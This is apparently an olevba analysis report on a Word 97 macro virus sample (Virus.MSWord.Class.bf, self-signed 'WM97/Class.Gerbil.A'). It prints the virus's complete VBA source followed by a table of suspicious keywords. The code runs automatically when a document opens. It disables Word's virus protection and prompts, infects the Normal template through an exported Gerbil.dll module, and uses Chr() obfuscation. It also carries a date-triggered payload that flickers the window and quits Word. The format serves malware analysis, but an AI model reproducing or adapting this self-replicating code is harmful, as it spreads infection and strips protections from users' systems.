olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bf-9c53800d2567e74333db733e519e5c1aeabeeab2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bf-9c53800d2567e74333db733e519e5c1aeabeeab2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 75

I = 0

Options.VirusProtection = Chr(48): cxr = 0: ox = 1: rc = 4: zz = 2

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

If Month(Now()) > 6 And Day(Now()) = 13 Then Call ©

gx = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

xg = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

If xg > 94 And gx > Abs(cxr) Then GoTo 75

If xg < 94 Then

 Set bg = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Name = bg.Name

 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(71) + Chr(101) + Chr(114) + Chr(98) + Chr(105) + Chr(108) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

End If

If gx = Abs(cxr) Then Set bg = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

 Infect = Int(Rnd * 50)

 If Infect = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

 bg.codemodule.AddFromFile Windows.Application.Path & Chr(71) + Chr(101) + Chr(114) + Chr(98) + Chr(105) + Chr(108) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

 With bg.codemodule

    For j = Abs(ox) To Abs(rc)

    .deletelines Abs(ox)

    Next j

 End With
  
 If xg < 94 Then

    With bg.codemodule

    .replaceline Abs(ox), "Sub AutoClose()"

    .replaceline 99, "Sub ToolsMacro()"
       
    rd = Int(Rnd * 100)

If rd = 99 Then .replaceline 69, ".replaceline j, Chr(39) & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
    
End With

 End If

 With bg.codemodule

    For j = Abs(zz) To 96 Step Abs(zz)

    .replaceline j, Chr(39) & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow

    Next j

 End With

75:

 If xg > 94 And gx = Abs(cxr) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Private Sub ©()

Top:

I = I + 1

On Error Resume Next

Application.WindowState = wdWindowStateMinimize

Application.WindowState = wdWindowStateMaximize

If I < 10 Then GoTo Top

Application.Quit

End Sub

Sub ViewVBCode()

End Sub 'WM97/Class.Gerbil.A By Virus ;) Smile

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
